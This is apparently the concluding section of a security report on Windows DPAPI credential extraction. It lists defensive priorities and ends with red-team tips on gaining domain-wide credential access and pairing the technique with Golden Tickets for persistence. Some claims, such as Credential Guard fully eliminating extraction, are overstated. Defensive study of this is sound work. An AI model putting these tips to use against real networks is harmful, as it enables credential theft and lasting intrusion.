- **Reference:** [CISA Lazarus Analysis](https://www.cisa.gov/news-events/alerts/2021/07/19/ransomware-attacks-critical-infrastructure)

---

## 12. CONCLUSION

DPAPI credential extraction is a **universal credential harvesting technique** that provides decryption of **all user-protected credentials on a system**. The technique is **ACTIVE** and remains effective against most organizations lacking Credential Guard deployment.

**Key Defense Priorities:**
1. **Deploy Credential Guard** on Windows 10+/Server 2022+ (eliminates DPAPI extraction)
2. **Enable DPAPI auditing** (Event ID 16385) for real-time detection
3. **Restrict access to Protected/Credentials directories** via NTFS permissions
4. **Monitor Chrome/Edge Local State file access** to prevent browser key extraction
5. **Implement Conditional Access** with MFA to limit use of extracted credentials

**Operational Notes for Red Teams:**
- DPAPI extraction requires only user-level access for own credentials; no elevation needed
- Domain DPAPI backup key access requires Domain Admin; yields universal credential access
- Credential Guard mitigates entire attack surface (Defender for Windows 10+/Server 2022+)
- Browser DPAPI key extraction is separate attack path if Credential Guard doesn't protect Chrome
- Combine with Golden Ticket creation for long-term domain persistence

---